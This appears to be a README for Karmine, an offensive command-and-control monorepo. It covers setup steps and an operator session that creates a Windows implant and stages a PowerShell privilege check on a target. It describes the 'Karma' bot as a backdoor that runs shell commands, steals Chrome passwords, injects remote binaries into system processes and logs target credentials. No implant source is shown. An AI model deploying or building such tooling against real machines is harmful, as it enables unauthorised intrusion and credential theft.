# Karmine

Karmine is a monorepo which will contain several security-related projects in a mix of languages, mainly:
- Go
- C / C++
- Python
- Rust

## Setup 

1. Run `install.sh` in the project root. This will set up configuration files, the `bin`, and an x509 certificate-key pair. You can replace these with your own by replacing the ones in `~/.kdots/` with files of the same name.

2. Install and start mysql-server. For example, the command to do so on ubuntu is:

```
sudo apt install mysql-server
sudo service mysql start
```

3. Run the sql initialisation script.

```
mysql -u root -h localhost < init.sql
```

## Usage 

### Example

```
$  new karma --os windows --interval 3
'karma' saved to /home/pygrum/karmine/bin


$  profiles view

uuid                                 | name         | strain
------------------------------------------------------------
181d70e4-cbc6-4bfd-9e96-7ccb31dbbc27 | 3a89aee34882 | karma

$  stage cmd --for 3a89aee34882 exec "powershell -c whoami /priv"
$  % 3a89aee34882 %  ---
INFO[1139] exec powershell -c whoami /priv               type=cmd
INFO[1139] 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

The Karmine database logs all staged commands, active strains, and credentials from targets. In-built commands can be used to view this information.

### Commands

As of March 15 2023, there are 3 commands:
- `new`
- `profiles`
- `stage`

To get usage info about these commands, type `<command> --help`

## Karma

Karma is a bot with backdoor functionality, capable of executing shell commands, stealing chrome passwords, and injecting remote binaries into legitimate system processes. It communicates over a secure mTLS connection, and supports threaded processing and execution of commands. 
